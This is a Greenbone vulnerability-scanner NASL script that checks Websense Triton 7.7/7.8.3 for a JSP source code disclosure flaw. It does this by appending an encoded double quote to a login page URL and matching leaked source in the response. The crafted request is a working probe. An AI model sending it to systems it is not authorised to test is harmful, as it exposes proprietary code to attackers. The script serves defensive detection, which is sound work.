# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:websense:triton";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106002");
  script_version("2025-06-25T05:41:02+0000");
  script_tag(name:"last_modification", value:"2025-06-25 05:41:02 +0000 (Wed, 25 Jun 2025)");
  script_tag(name:"creation_date", value:"2015-06-03 10:18:34 +0700 (Wed, 03 Jun 2015)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Websense Triton 7.8.3/7.7 Source Code Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_websense_triton_detect.nasl");
  script_mandatory_keys("websense_triton/installed");

  script_tag(name:"summary", value:"Websense Triton is prone to a source code disclosure
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"By appending a double quote character after JSP URLs, Websense
  will return the source code of the JSP instead of executing the JSP.");

  script_tag(name:"impact", value:"An attacker can use this vulnerability to inspect parts of
  Websense's source code in order to gain more knowledge about Websense's internals.");

  script_tag(name:"affected", value:"Websense Triton versions 7.7 and 7.8.3 are known to be
  vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"Install the hotfix 02 for version 7.8.4 or update to version
  8.0 or later.");

  script_xref(name:"URL", value:"https://www.securify.nl/advisory/source-code-disclosure-of-websense-triton-jsp-files-via-double-quote-character/");
  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2015/Mar/105");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/triton/login/pages/certificateDone.jsp%22";

if (http_vuln_check(port: port, url: url, check_header: TRUE,
                    pattern: '<%@page import="com\\.websense\\.java\\.eip\\.client\\.login\\.BBLogin"%>')) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
